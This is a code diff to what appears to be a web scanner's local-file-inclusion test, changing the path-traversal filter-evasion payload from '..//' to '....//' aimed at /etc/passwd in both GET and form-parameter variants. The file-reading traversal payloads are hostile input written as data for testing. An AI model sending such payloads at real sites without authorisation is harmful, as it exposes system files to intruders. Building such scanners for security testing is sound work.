@@ -155,7 +155,7 @@ def test_lfi_linux(url:str,params:list,method:str)->str:
         # simple filter evasion
         for i in range(1,11):
             parameters = "?"
-            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
+            payload = 'file_lincox/' + '....//'*i+'/etc/passwd'
             for param in params:
                 parameters += f"&{param}={quote_plus(payload)}"
             r = requests.get(url+parameters,headers=get_headers())
@@ -187,7 +187,7 @@ def test_lfi_linux(url:str,params:list,method:str)->str:
 
         # simple filter evasion
         for i in range(1,11):
-            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
+            payload = 'file_lincox/' + '....//'*i+'/etc/passwd'
             parameters = {}
             for param in params:
                 parameters[param] = payload
